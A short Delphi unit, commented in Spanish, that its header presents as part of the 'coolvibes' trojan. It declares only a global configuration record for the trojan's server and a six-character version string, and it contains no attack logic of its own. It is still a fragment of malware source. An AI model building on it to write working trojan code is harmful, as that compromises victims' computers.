{Unit perteneciente al troyano coolvibes que contiene todas las variables
configurables del troyano}
unit UnitVariables;

interface

uses
  SettingsDef; //Aquí se define el record de configuracion (TSettings)

var
  Configuracion: TSettings; //Aquí se guardaran todas las opciones editables del server.
  //Es un record que está definido en la unidad SettingsDef.

  VersionDelServer: array[0..5] of char;
 //Pequeña string donde se guarda la versión del servidor,
 //solo le caben 6 caracteres. Si se necesita más, hay que agrandarla.

implementation

end.
